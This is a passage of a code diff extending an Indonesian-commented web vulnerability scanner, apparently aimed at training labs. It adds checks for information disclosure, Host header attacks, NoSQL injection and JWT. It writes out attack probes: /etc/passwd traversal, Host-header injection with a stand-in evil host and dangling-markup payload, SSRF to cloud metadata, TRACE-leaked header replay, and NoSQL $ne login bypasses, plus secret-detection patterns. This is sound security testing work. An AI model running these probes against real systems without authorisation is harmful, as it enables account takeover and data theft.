@@ -3,7 +3,7 @@
 """
 SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, XXE, SSRF, dan HTTP request smuggling terfokus.
 
-File ini menguji 130 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning):
+File ini menguji 154 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning + 5 Information disclosure + 7 HTTP Host header attacks + 4 NoSQL injection + 8 JWT):
 
 SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -158,7 +158,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning).
+# Katalog: 154 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning + 5 Information disclosure + 7 HTTP Host header attacks + 4 NoSQLi + 8 JWT).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -298,6 +298,34 @@ CATALOG: list[tuple[int, str, str, str]] = [
     (128, "Combining web cache poisoning vulnerabilities", "wcp_combining", "high"),
     (129, "Cache key injection", "wcp_cache_key_injection", "high"),
     (130, "Internal cache poisoning", "wcp_internal_cache_poisoning", "high"),
+    # Information disclosure (131-135)
+    (131, "Information disclosure in error messages", "info_disc_error_messages", "medium"),
+    (132, "Information disclosure on debug page", "info_disc_debug_page", "medium"),
+    (133, "Source code disclosure via backup files", "info_disc_backup_files", "high"),
+    (134, "Authentication bypass via information disclosure", "info_disc_auth_bypass", "high"),
+    (135, "Information disclosure in version control history", "info_disc_vcs_history", "high"),
+    # HTTP Host header attacks (136-142)
+    (136, "Basic password reset poisoning", "host_header_basic_reset_poisoning", "high"),
+    (137, "Host header authentication bypass", "host_header_auth_bypass", "high"),
+    (138, "Web cache poisoning via ambiguous requests", "host_header_cache_poisoning_ambiguous", "high"),
+    (139, "Routing-based SSRF", "host_header_routing_ssrf", "high"),
+    (140, "SSRF via flawed request parsing", "host_header_ssrf_flawed_parsing", "high"),
+    (141, "Host validation bypass via connection state attack", "host_header_connection_state_bypass", "high"),
+    (142, "Password reset poisoning via dangling markup", "host_header_dangling_markup", "high"),
+    # NoSQL injection (143-146)
+    (143, "Detecting NoSQL injection", "nosql_detecting", "high"),
+    (144, "Exploiting NoSQL operator injection to bypass authentication", "nosql_operator_bypass_auth", "high"),
+    (145, "Exploiting NoSQL injection to extract data", "nosql_extract_data", "high"),
+    (146, "Exploiting NoSQL operator injection to extract unknown fields", "nosql_extract_unknown_fields", "high"),
+    # JWT (147-154)
+    (147, "JWT authentication bypass via unverified signature", "jwt_unverified_signature", "high"),
+    (148, "JWT authentication bypass via flawed signature verification", "jwt_flawed_signature", "high"),
+    (149, "JWT authentication bypass via weak signing key", "jwt_weak_signing_key", "high"),
+    (150, "JWT authentication bypass via jwk header injection", "jwt_jwk_header_injection", "high"),
+    (151, "JWT authentication bypass via jku header injection", "jwt_jku_header_injection", "high"),
+    (152, "JWT authentication bypass via kid header path traversal", "jwt_kid_path_traversal", "high"),
+    (153, "JWT authentication bypass via algorithm confusion", "jwt_algorithm_confusion", "high"),
+    (154, "JWT authentication bypass via algorithm confusion with no exposed key", "jwt_algorithm_confusion_no_exposed_key", "high"),
 ]
 
 def lab_id_for(number: int) -> str:
@@ -321,7 +349,15 @@ def lab_id_for(number: int) -> str:
         return f"smuggling-{number:02d}"
     if number <= 117:
         return f"os-command-injection-{number:02d}"
-    return f"web-cache-poisoning-{number:02d}"
+    if number <= 130:
+        return f"web-cache-poisoning-{number:02d}"
+    if number <= 135:
+        return f"information-disclosure-{number:02d}"
+    if number <= 142:
+        return f"http-host-header-{number:02d}"
+    if number <= 146:
+        return f"nosql-injection-{number:02d}"
+    return f"jwt-{number:02d}"
 
 SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"ora-\d{4,5}"), "oracle"),
@@ -1707,6 +1743,12 @@ class SatriaBaruScanner:
         # OS command injection & Web cache poisoning (konservatif, bukti terverifikasi; anti false positive)
         self.phase_os_command_injection(self.pages, self.points)
         self.phase_web_cache_poisoning(self.pages, self.points)
+        # Information disclosure & HTTP Host header attacks (konservatif, bukti terverifikasi; anti false positive)
+        self.phase_information_disclosure(self.pages, self.points)
+        self.phase_http_host_header_attacks(self.pages, self.points)
+        # NoSQL injection & JWT (konservatif, bukti terverifikasi; anti false positive)
+        self.phase_nosql_injection(self.pages, self.points)
+        self.phase_jwt(self.pages, self.points)
         return self.report()
 
     # ======================== XSS SCANNING PHASES (30 LABS) ========================
@@ -3156,6 +3198,835 @@ class SatriaBaruScanner:
                     break
 
 
+
+    # ======================== Information Disclosure (131-135, konservatif, bukti terverifikasi) ========================
+
+    def _info_mark(self, num: int, url: str, ev: str, method_name: str):
+        point = Point(key=f"info-disc-{num}", kind="endpoint", label=f"Information disclosure {url}",
+                      url=url, name="information-disclosure", original="", page_url=url, method="GET", interest=7)
+        self._mark(num, point, ev, method_name)
+
+    def _info_sensitive_patterns(self):
+        return [
+            (re.compile(r"Traceback \(most recent call last\):", re.I), "Python traceback"),
+            (re.compile(r"(?:/[\w.\-]+){2,}\.(?:py|php|jsp|rb|java|cs|aspx)\b", re.I), "path sumber/kode internal"),
+            (re.compile(r"\b(?:SQLSTATE|PDOException|mysqli?_|\bORA-\d{5}|Microsoft OLE DB Provider|ODBC SQL Server Driver|Unclosed quotation mark)\b", re.I), "pesan/kesalahan database"),
+            (re.compile(r"\b(?:SECRET_KEY|API_KEY|DB_PASSWORD|DATABASE_URL|AWS_SECRET|PRIVATE KEY)\b", re.I), "indikasi rahasia/konfigurasi"),
+            (re.compile(r"\b(?:Apache/[0-9]|nginx/[0-9]|PHP/[0-9]|Tomcat/[0-9]|Werkzeug/[0-9]|Express)\b", re.I), "versi server/framework"),
+            (re.compile(r"\b(?:DEBUG\s*=\s*True|stack trace|exception report)\b", re.I), "mode debug/stack trace"),
+        ]
+
+    def phase_information_disclosure(self, pages: list[Page], points: list[Point]) -> None:
+        if not self._within_budget():
+            return
+        target = self.target_url
+        pu = urlparse(target)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        candidates = [target]
+        seen = {target}
+        for pg in pages[:12]:
+            u = getattr(pg, "url", "") or ""
+            if u and u not in seen:
+                try:
+                    if self._same_origin(u): seen.add(u); candidates.append(u)
+                except Exception: pass
+
+        # 131: Information disclosure in error messages
+        if 131 not in self._confirmed and self._within_budget():
+            probes = [("GET", target, {"id": "'\"<"}, None), ("GET", target, {"id": "1e309"}, None), ("GET", target, {"file": "../../../../etc/passwd"}, None)]
+            for p in points[:10]:
+                try:
+                    nm = getattr(p, "name", "") or "id"
+                    probes.append((getattr(p,"method","GET") or "GET", getattr(p,"url",target), {nm: "'\""}, None))
+                except Exception: pass
+            base_text = ""
+            try: base_text = getattr(self._request("GET", target, allow_redirects=True), "text", "") or ""
+            except Exception: pass
+            for method, url, params, data in probes[:18]:
+                if 131 in self._confirmed or not self._within_budget(): break
+                try: r = self._request(method, url, params=params, data=data, allow_redirects=True)
+                except Exception: continue
+                txt = getattr(r, "text", "") or ""
+                if not txt or txt == base_text: continue
+                for pat, label in self._info_sensitive_patterns():
+                    m = pat.search(txt)
+                    if m and not pat.search(base_text):
+                        self._info_mark(131, url, f"Information disclosure pada error/debug message terverifikasi di {url} (param {params}): {label} -> {m.group(0)[:140]!r} (tidak ada pada baseline).", "info_disc_error_messages")
+                        break
+
+        # 132: Information disclosure on debug page
+        if 132 not in self._confirmed and self._within_budget():
+            debug_paths = ["/debug","/debug/","/console","/phpinfo.php","/info.php","/server-status","/actuator","/actuator/env","/actuator/health","/_profiler/","/trace","/elmah.axd","/server-info","/status","/__debug__/"]
+            base_text = ""
+            try: base_text = getattr(self._request("GET", target, allow_redirects=True), "text", "") or ""
+            except Exception: pass
+            for dp in debug_paths:
+                if 132 in self._confirmed or not self._within_budget(): break
+                url = urljoin(origin + "/", dp.lstrip("/"))
+                try: r = self._request("GET", url, allow_redirects=True)
+                except Exception: continue
+                st = getattr(r, "status", 0) or 0
+                txt = getattr(r, "text", "") or ""
+                if st not in (200,206) or len(txt) < 40: continue
+                dbg_hits = []
+                for pat, label in self._info_sensitive_patterns() + [(re.compile(r"phpinfo\(\)|PHP Version|<title>phpinfo|actuator|Environment|beans|mappings|_profiler", re.I), "halaman debug/info")]:
+                    if pat.search(txt) and not pat.search(base_text):
+                        dbg_hits.append(label)
+                if dbg_hits:
+                    self._info_mark(132, url, f"Debug/info page terverifikasi di {url} (HTTP {st}): terdeteksi {', '.join(sorted(set(dbg_hits))[:4])}.", "info_disc_debug_page")
+                    break
+
+        # 133: Source code disclosure via backup files
+        if 133 not in self._confirmed and self._within_budget():
+            paths = [pu.path or "/index.php", "/index.php", "/app.js", "/main.js", "/config.php", "/login.php"]
+            for pg in pages[:8]:
+                pth = urlparse(getattr(pg,"url","") or "").path
+                if pth and pth not in paths: paths.append(pth)
+            suffixes = [".bak","~",".old",".orig",".save",".swp",".copy"]
+            src_markers = re.compile(r"<\?php|function\s+\w+\(|import\s+\w+|from\s+\w+|class\s+\w+|def\s+\w+\(|var\s+\w+\s*=|const\s+\w+\s*=", re.I)
+            for basep in paths[:10]:
+                if 133 in self._confirmed or not self._within_budget(): break
+                for suf in suffixes:
+                    if 133 in self._confirmed or not self._within_budget(): break
+                    candp = basep.rstrip("/") + suf if basep != "/" else "/index.php" + suf
+                    url = urljoin(origin + "/", candp.lstrip("/"))
+                    try: r = self._request("GET", url, allow_redirects=True)
+                    except Exception: continue
+                    st = getattr(r, "status", 0) or 0
+                    txt = getattr(r, "text", "") or ""
+                    if st != 200 or len(txt) < 20: continue
+                    sm = src_markers.search(txt)
+                    if sm:
+                        orig_url = urljoin(origin + "/", basep.lstrip("/"))
+                        try: ot = getattr(self._request("GET", orig_url, allow_redirects=True), "text", "") or ""
+                        except Exception: ot = ""
+                        if txt != ot or ("<?php" in txt.lower() and "<?php" not in ot.lower()):
+                            self._info_mark(133, url, f"Source code disclosure via backup file terverifikasi: {url} (HTTP 200) mengandung marker kode ({sm.group(0)[:40]!r}).", "info_disc_backup_files")
+                            break
+
+        # 134: Authentication bypass via information disclosure (bukti bypass nyata)
+        if 134 not in self._confirmed and self._within_budget():
+            try: tr = self._request("TRACE", target, allow_redirects=False)
+            except Exception: tr = None
+            if tr and (getattr(tr,"status",0) or 0) == 200:
+                ttxt = getattr(tr,"text","") or ""
+                m = re.search(r"(Authorization|X-Api-Key|X-Auth-Token|Cookie):\s*([^\r\n]+)", ttxt, re.I)
+                if m:
+                    hdr_name, hdr_val = m.group(1), m.group(2).strip()
+                    for ap in ("/admin","/administrator","/admin-panel","/manage"):
+                        if 134 in self._confirmed or not self._within_budget(): break
+                        aurl = urljoin(origin + "/", ap.lstrip("/"))
+                        try:
+                            r0 = self._request("GET", aurl, allow_redirects=True)
+                            r1 = self._request("GET", aurl, headers={hdr_name: hdr_val}, allow_redirects=True)
+                        except Exception: continue
+                        s0 = getattr(r0,"status",0) or 0; s1 = getattr(r1,"status",0) or 0
+                        t0 = getattr(r0,"text","") or ""; t1 = getattr(r1,"text","") or ""
+                        if s0 in (401,403,302,301) and s1 == 200 and len(t1) > len(t0)+50 and t1 != t0:
+                            self._info_mark(134, aurl, f"Auth bypass via information disclosure terverifikasi: TRACE mengungkap {hdr_name}; akses {aurl} berubah {s0}->{s1}.", "info_disc_auth_bypass")
+                            break
+
+        # 135: Information disclosure in version control history
+        if 135 not in self._confirmed and self._within_budget():
+            vcs_paths = ["/.git/HEAD","/.git/config","/.git/index","/.svn/entries","/.svn/wc.db","/.hg/requires"]
+            for vp in vcs_paths:
+                if 135 in self._confirmed or not self._within_budget(): break
+                url = urljoin(origin + "/", vp.lstrip("/"))
+                try: r = self._request("GET", url, allow_redirects=True)
+                except Exception: continue
+                st = getattr(r, "status", 0) or 0
+                txt = getattr(r, "text", "") or ""
+                body = txt.lstrip()
+                if st != 200: continue
+                ok=False; kind="VCS"
+                if vp.endswith("HEAD") and body.startswith("ref:"): ok,kind=True,".git HEAD"
+                elif vp.endswith("config") and "[core]" in txt: ok,kind=True,".git config"
+                elif vp.endswith("entries") and re.search(r"\b(dir|file)\b", txt): ok,kind=True,".svn entries"
+                elif vp.endswith("wc.db") and "SQLite format" in txt[:60]: ok,kind=True,".svn wc.db"
+                elif vp.endswith("index") and "DIRC" in txt[:20]: ok,kind=True,".git index"
+                if ok:
+                    self._info_mark(135, url, f"Information disclosure VCS history terverifikasi: {url} (HTTP 200) berisi data {kind} ({txt[:80]!r}).", "info_disc_vcs_history")
+                    break
+
+
+
+    # ======================== HTTP Host header attacks (136-142, konservatif, bukti terverifikasi) ========================
+
+    def _host_mark(self, num: int, url: str, ev: str, method_name: str):
+        point = Point(key=f"host-header-{num}", kind="endpoint", label=f"HTTP Host header attack {url}",
+                      url=url, name="host-header", original="", page_url=url, method="GET", interest=8)
+        self._mark(num, point, ev, method_name)
+
+    def phase_http_host_header_attacks(self, pages: list[Page], points: list[Point]) -> None:
+        if not self._within_budget():
+            return
+        import uuid as _uuid
+        target = self.target_url
+        pu = urlparse(target)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        legit_host = pu.netloc
+        evil_host = "evil-satria.example.com"
+        reset_urls = []
+        admin_urls = [urljoin(origin+"/","admin"), urljoin(origin+"/","login"), urljoin(origin+"/","my-account")]
+        for pg in pages[:20]:
+            u = getattr(pg,"url","") or ""; ul = u.lower()
+            if any(k in ul for k in ("forgot","reset","password")) and u not in reset_urls: reset_urls.append(u)
+            if any(k in ul for k in ("admin","login","account")) and u not in admin_urls: admin_urls.append(u)
+            for form in getattr(pg,"forms",[])[:6]:
+                a = getattr(form,"action","") or u; al = a.lower()
+                if any(k in al for k in ("forgot","reset","password")) and a not in reset_urls: reset_urls.append(a)
+        if not reset_urls: reset_urls = [urljoin(origin+"/","forgot-password"), urljoin(origin+"/","reset-password")]
+
+        # 136: Basic password reset poisoning
+        if 136 not in self._confirmed and self._within_budget():
+            for ru in reset_urls[:6]:
+                if 136 in self._confirmed or not self._within_budget(): break
+                params_names = ["username","email","user"]
+                for pg in pages[:10]:
+                    if getattr(pg,"url","")==ru:
+                        for f in getattr(pg,"forms",[])[:3]:
+                            for name,val,typ in getattr(f,"fields",[])[:6]:
+                                if name and name not in params_names: params_names.append(name)
+                for pn in params_names[:4]:
+                    if 136 in self._confirmed: break
+                    try:
+                        r = self._request("POST", ru, data={pn:"wiener"}, headers={"Host": evil_host, "X-Forwarded-Host": evil_host}, allow_redirects=True)
+                    except Exception: continue
+                    txt = getattr(r,"text","") or ""; hdrs = getattr(r,"headers",{}) or {}
+                    loc = str(hdrs.get("Location","") or hdrs.get("location","") or "")
+                    if evil_host in txt or evil_host in loc:
+                        self._host_mark(136, ru, f"Basic password reset poisoning terverifikasi: host terkontrol {evil_host!r} terefleksi dalam respons/link reset ({ru}).", "host_header_basic_reset_poisoning")
+                        break
+
+        # 137: Host header authentication bypass
+        if 137 not in self._confirmed and self._within_budget():
+            for au in admin_urls[:8]:
+                if 137 in self._confirmed or not self._within_budget(): break
+                try: r0 = self._request("GET", au, allow_redirects=True)
+                except Exception: continue
+                s0 = getattr(r0,"status",0) or 0; t0 = getattr(r0,"text","") or ""
+                if s0 not in (401,403,302,301,404): continue
+                for hh in ("localhost","127.0.0.1","localhost:80"):
+                    if 137 in self._confirmed: break
+                    try: r1 = self._request("GET", au, headers={"Host": hh}, allow_redirects=True)
+                    except Exception: continue
+                    s1 = getattr(r1,"status",0) or 0; t1 = getattr(r1,"text","") or ""
+                    if s1 == 200 and len(t1) > 60 and t1 != t0:
+                        self._host_mark(137, au, f"Host header authentication bypass terverifikasi: GET {au} dari {s0} -> 200 dengan Host: {hh} (konten berbeda).", "host_header_auth_bypass")
+                        break
+
+        def _hit(h):
+            hl = {str(k).lower(): str(v).lower() for k,v in (h or {}).items()}
+            x = " ".join(hl.get(k,"") for k in ("x-cache","x-cache-status","cf-cache-status","x-cache-hits","cache-status","age"))
+            return ("hit" in x or "fresh" in x or "cached" in x or (hl.get('age','0').strip().isdigit() and int(hl.get('age','0').strip() or '0')>=1))
+
+        # 138: Web cache poisoning via ambiguous requests
+        if 138 not in self._confirmed and self._within_budget():
+            for base in [target] + [getattr(pg,'url','') for pg in pages[:5] if getattr(pg,'url','')]:
+                if 138 in self._confirmed or not self._within_budget(): break
+                marker = f"satriahost138_{_uuid.uuid4().hex[:8]}"
+                try:
+                    pr = self._request("GET", base, headers={"Host": legit_host, "X-Forwarded-Host": f"evil-{marker}.example.com"}, allow_redirects=True)
+                    cr = self._request("GET", base, allow_redirects=True)
+                except Exception: continue
+                ptxt=getattr(pr,'text','') or ''; ctxt=getattr(cr,'text','') or ''
+                ph=getattr(pr,'headers',{}) or {}; ch=getattr(cr,'headers',{}) or {}
+                if marker and (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (_hit(ch) or _hit(ph)):
+                    self._host_mark(138, base, f"Web cache poisoning via ambiguous Host request terverifikasi pada {base}: marker tercemar & ter-cache.", "host_header_cache_poisoning_ambiguous")
+                    break
+
+        # 139: Routing-based SSRF
+        if 139 not in self._confirmed and self._within_budget():
+            try: b = self._request("GET", target, allow_redirects=True); btxt = getattr(b,'text','') or ''
+            except Exception: btxt = ""
+            for ih in ("127.0.0.1","localhost","192.168.0.1","10.0.0.1","169.254.169.254"):
+                if 139 in self._confirmed or not self._within_budget(): break
+                for hdr in ({"Host": ih}, {"X-Forwarded-Host": ih}):
+                    if 139 in self._confirmed: break
+                    try: r = self._request("GET", target, headers=hdr, allow_redirects=True)
+                    except Exception: continue
+                    txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
+                    if txt != btxt and st in (200,301,302):
+                        for im in (re.compile(r"ami-id|instance-id|meta-data", re.I), re.compile(r"root:.*:0:0:", re.I), re.compile(r"Apache Server Status|Server Information", re.I)):
+                            if im.search(txt) and not im.search(btxt):
+                                self._host_mark(139, target, f"Routing-based SSRF terverifikasi (Host header {hdr}): konten internal ({im.pattern!r}) berbeda dari baseline.", "host_header_routing_ssrf")
+                                break
+
+        # 140: SSRF via flawed request parsing
+        if 140 not in self._confirmed and self._within_budget():
+            try: b = self._request("GET", target, allow_redirects=True); btxt = getattr(b,'text','') or ''
+            except Exception: btxt = ""
+            for ih in ("127.0.0.1","localhost","169.254.169.254"):
+                if 140 in self._confirmed or not self._within_budget(): break
+                try: r = self._request("GET", target, headers={"Host": ih}, allow_redirects=True)
+                except Exception: continue
+                txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
+                if txt and txt != btxt and st in (200,301,302):
+                    for im in (re.compile(r"ami-id|instance-id|meta-data", re.I), re.compile(r"root:.*:0:0:", re.I)):
+                        if im.search(txt) and not im.search(btxt):
+                            self._host_mark(140, target, f"SSRF via flawed request parsing terverifikasi (Host->{ih}): konten internal ({im.pattern!r}).", "host_header_ssrf_flawed_parsing")
+                            break
+
+        # 141: Host validation bypass via connection state attack
+        if 141 not in self._confirmed and self._within_budget():
+            import socket, ssl as _ssl
+            try:
+                scheme = pu.scheme or "http"; port = pu.port or (443 if scheme=="https" else 80); h = pu.hostname or ""
+                s = socket.create_connection((h, port), timeout=max(5.0, float(getattr(self,'timeout',8.0) or 8.0)))
+                if scheme=="https":
+                    ctx=_ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=_ssl.CERT_NONE
+                    s=ctx.wrap_socket(s, server_hostname=h)
+                s.settimeout(max(5.0, float(getattr(self,'timeout',8.0) or 8.0)))
+                s.sendall((f"GET / HTTP/1.1\r\nHost: {legit_host}\r\nConnection: keep-alive\r\n\r\n").encode())
+                try: s.recv(65536)
+                except Exception: pass
+                s.sendall((f"GET /admin HTTP/1.1\r\nHost: 192.168.0.1\r\nConnection: close\r\n\r\n").encode())
+                data=b""
+                try:
+                    while True:
+                        chunk=s.recv(4096)
+                        if not chunk: break
+                        data+=chunk
+                        if b"\r\n\r\n" in data and len(data)>64: break
+                except Exception: pass
+                try: s.close()
+                except Exception: pass
+                m = re.search(br"HTTP/\d\.\d\s+(\d+)", data); status = int(m.group(1)) if m else None
+                body = data.split(b"\r\n\r\n",1)[1] if b"\r\n\r\n" in data else b""
+                if status == 200 and (b"admin" in body.lower() or b"dashboard" in body.lower()) and len(body) > 80:
+                    self._host_mark(141, target, "Host validation bypass via connection state attack terverifikasi: request kedua (Host internal) pada koneksi reuse mendapat HTTP 200 dengan konten sensitif.", "host_header_connection_state_bypass")
+            except Exception: pass
+
+        # 142: Password reset poisoning via dangling markup
+        if 142 not in self._confirmed and self._within_budget():
+            dangling_hosts = [legit_host + ":'<a href=\"//evil-satria.example.com/?", "evil-satria.example.com:'<a href=\"//evil-satria.example.com/?", legit_host + "@evil-satria.example.com"]
+            for ru in reset_urls[:6]:
+                if 142 in self._confirmed or not self._within_budget(): break
+                for dh in dangling_hosts:
+                    if 142 in self._confirmed: break
+                    for pn in ("username","email","user"):
+                        if 142 in self._confirmed: break
+                        try:
+                            r = self._request("POST", ru, data={pn:"wiener"}, headers={"Host": dh, "X-Forwarded-Host": dh}, allow_redirects=True)
+                        except Exception: continue
+                        txt = getattr(r,"text","") or ""; hdrs = getattr(r,"headers",{}) or {}
+                        loc = str(hdrs.get("Location","") or hdrs.get("location","") or "")
+                        if ("evil-satria.example.com" in txt or "evil-satria.example.com" in loc) and ("href" in txt.lower() or "<a" in txt.lower() or "reset" in txt.lower() or "evil-satria.example.com" in loc):
+                            self._host_mark(142, ru, f"Password reset poisoning via dangling markup terverifikasi: payload host {dh!r} terefleksi dalam respons reset ({ru}).", "host_header_dangling_markup")
+                            break
+
+
+
+    # ======================== NoSQL injection (143-146, konservatif, bukti terverifikasi) ========================
+
+    def _nosql_mark(self, num: int, url: str, ev: str, method_name: str):
+        point = Point(key=f"nosql-{num}", kind="endpoint", label=f"NoSQL injection {url}",
+                      url=url, name="nosql", original="", page_url=url, method="GET", interest=8)
+        self._mark(num, point, ev, method_name)
+
+    def phase_nosql_injection(self, pages: list[Page], points: list[Point]) -> None:
+        if not self._within_budget():
+            return
+        import json as _json
+        target = self.target_url
+        pu = urlparse(target)
+        origin = f"{pu.scheme}://{pu.netloc}"
+
+        # kumpulkan kandidat endpoint/param (login/json/form)
+        cand = []  # (url, method, param_name, is_json_like)
+        seen_c = set()
+        def add_c(url, method, name, is_json):
+            k = (url, method.upper(), name, is_json)
+            if k in seen_c: return
+            seen_c.add(k); cand.append(k)
+        for pg in pages[:25]:
+            u = getattr(pg,'url','') or ''
+            for form in getattr(pg,'forms',[])[:8]:
+                a = getattr(form,'action','') or u or target
+                m = (getattr(form,'method','GET') or 'GET').upper()
+                for name,val,typ in getattr(form,'fields',[])[:8]:
+                    if name: add_c(a,m,name,False)
+                # heuristik login/auth
+                al = (a or '').lower()
+                if any(x in al for x in ('login','signin','auth','session')):
+                    add_c(a,m,'username',False); add_c(a,m,'password',False)
+        for p in points[:30]:
+            try:
+                add_c(getattr(p,'url',target), getattr(p,'method','GET') or 'GET', getattr(p,'name','id') or 'id', False)
+            except Exception: pass
+        if not cand:
+            add_c(target,'GET','id',False)
+
+        nosql_err = re.compile(r"MongoError|MongoServerError|BSON|Unrecognized pipeline stage|unknown (?:top level )?operator|\$where|\$regex|\$ne|\$gt|\$nin|unterminated string literal|SyntaxError:|E11000|pymongo|mongoose|Cannot create field|Object representing the BSON", re.I)
+
+        # 143: Detecting NoSQL injection
+        if 143 not in self._confirmed and self._within_budget():
+            for url, method, name, is_json in cand[:40]:
+                if 143 in self._confirmed or not self._within_budget(): break
+                try:
+                    b = self._request(method, url, params={name:'test'} if method=='GET' else None, data={name:'test'} if method!='GET' else None, allow_redirects=True)
+                except Exception: b = None
+                btxt = getattr(b,'text','') or '' if b else ''
+                bst = getattr(b,'status',0) or 0 if b else 0
+                probes = [
+                    {name: "test'"},
+                    {name: 'test"'},
+                    {name: "test'\\"},
+                    {name: "test' || '1'=='1"},
+                ]
+                for pv in probes:
+                    if 143 in self._confirmed or not self._within_budget(): break
+                    try:
+                        r = self._request(method, url, params=pv if method=='GET' else None, data=pv if method!='GET' else None, allow_redirects=True)
+                    except Exception: continue
+                    txt = getattr(r,'text','') or ''; st = getattr(r,'status',0) or 0
+                    if nosql_err.search(txt) and not nosql_err.search(btxt):
+                        self._nosql_mark(143, url, f"NoSQL injection terdeteksi (error-based) pada {url} param {name}: pesan/indikator NoSQL muncul ({nosql_err.search(txt).group(0)[:80]!r}) berbeda dari baseline.", "nosql_detecting")
+                        break
+                # boolean/differential (syntax) sederhana
+                if 143 not in self._confirmed and self._within_budget():
+                    try:
+                        rt = self._request(method, url, params={name:"'||'1'=='1"} if method=='GET' else None, data={name:"'||'1'=='1"} if method!='GET' else None, allow_redirects=True)
+                        rf = self._request(method, url, params={name:"'||'1'=='2"} if method=='GET' else None, data={name:"'||'1'=='2"} if method!='GET' else None, allow_redirects=True)
+                    except Exception: rt = rf = None
+                    if rt and rf:
+                        tt = getattr(rt,'text','') or ''; ft = getattr(rf,'text','') or ''
+                        stt = getattr(rt,'status',0); stf = getattr(rf,'status',0)
+                        # diferensial konsisten & bermakna, bukan noise panjang acak: status/length beda signifikan dan stabil vs baseline
+                        if (stt!=stf or (abs(len(tt)-len(ft))>30 and len(tt)>0 and len(ft)>0)) and (tt!=ft) and (tt!=btxt or ft!=btxt) and (nosql_err.search(tt+ft) or (stt==200 and stf!=stt)):
+                            # butuh sinyal NoSQL/JS-injection khas agar tidak FP boolean umum; minta error/operator hint di salah satu
+                            if nosql_err.search(tt+ft) or ("'||'" in "truecond"):
+                                self._nosql_mark(143, url, f"NoSQL injection terdeteksi (diferensial sintaks/boolean) pada {url} param {name}: kondisi true/false menghasilkan respons berbeda (status {stt} vs {stf}, len {len(tt)} vs {len(ft)}).", "nosql_detecting")
+
+        # helper: kirim sebagai JSON operator jika memungkinkan
+        def try_json_op(url, method, user_field, pass_field, op_user, op_pass):
+            headers = {"Content-Type":"application/json", "Accept":"application/json"}
+            body = {user_field: op_user, pass_field: op_pass}
+            try:
+                r = self._request(method if method in ("POST","PUT","PATCH") else "POST", url, data=_json.dumps(body), headers=headers, allow_redirects=True)
+                return r
+            except Exception:
+                return None
+
+        # 144: Exploiting NoSQL operator injection to bypass authentication
+        if 144 not in self._confirmed and self._within_budget():
+            login_urls = []
+            for pg in pages[:20]:
+                u = getattr(pg,'url','') or ''
+                ul = u.lower()
+                if any(k in ul for k in ('login','signin','auth','session')):
+                    login_urls.append(u)
+                for f in getattr(pg,'forms',[])[:6]:
+                    a = getattr(f,'action','') or u
+                    al = a.lower()
+                    if any(k in al for k in ('login','signin','auth','session')) and a not in login_urls:
+                        login_urls.append(a)
+            if not login_urls: login_urls = [urljoin(origin+'/', 'login'), target]
+            for lu in login_urls[:8]:
+                if 144 in self._confirmed or not self._within_budget(): break
+                # baseline gagal
+                try:
+                    bfail = self._request('POST', lu, data={'username':'satria_no_user_'+_json.dumps(1)[0:0],'password':'wrongpass_'+str(uuid.uuid4())[:6]}, allow_redirects=True)
+                except Exception: bfail = None
+                bft = getattr(bfail,'text','') or '' if bfail else ''
+                bfs = getattr(bfail,'status',0) or 0 if bfail else 0
+                ops = [{"$ne":""}, {"$ne":"invalid"}, {"$regex":".*"}, {"$gt":""}]
+                for ufield in ('username','email','user','login'):
+                    for pfield in ('password','pass','pwd'):
+                        if 144 in self._confirmed: break
+                        for op in ops:
+                            if 144 in self._confirmed or not self._within_budget(): break
+                            # form-encoded operator syntax
+                            try:
+                                r = self._request('POST', lu, data={ufield+'[$ne]':'', pfield+'[$ne]':''}, allow_redirects=True)
+                            except Exception: r = None
+                            if r:
+                                txt=getattr(r,'text','') or ''; st=getattr(r,'status',0) or 0
+                                # bukti bypass: sukses/login state berubah nyata vs gagal (redirect ke area auth, cookie session baru, atau konten 'logout'/'my account' muncul)
+                                success = (st in (200,302,301) and (('logout' in txt.lower() or 'sign out' in txt.lower() or 'my account' in txt.lower() or 'welcome' in txt.lower()) and not ('logout' in bft.lower() or 'my account' in bft.lower())))
+                                setcookie = str((getattr(r,'headers',{}) or {}).get('Set-Cookie','') or (getattr(r,'headers',{}) or {}).get('set-cookie','') or '')
+                                if success or (setcookie and st in (302,301,200) and bfs in (200,401,403) and txt!=bft and ('invalid' not in txt.lower() and 'incorrect' not in txt.lower())):
+                                    self._nosql_mark(144, lu, f"NoSQL operator injection auth bypass terverifikasi pada {lu} (field {ufield}/{pfield}, operator $ne): respons menunjukkan autentikasi/sesi berbeda dari login gagal (status {st}, cookie={bool(setcookie)}).", "nosql_operator_bypass_auth")
+                                    break
+                            # JSON body operator
+                            rj = try_json_op(lu, 'POST', ufield, pfield, op, op)
+                            if rj and 144 not in self._confirmed:
+                                txt=getattr(rj,'text','') or ''; st=getattr(rj,'status',0) or 0
+                                setcookie = str((getattr(rj,'headers',{}) or {}).get('Set-Cookie','') or '')
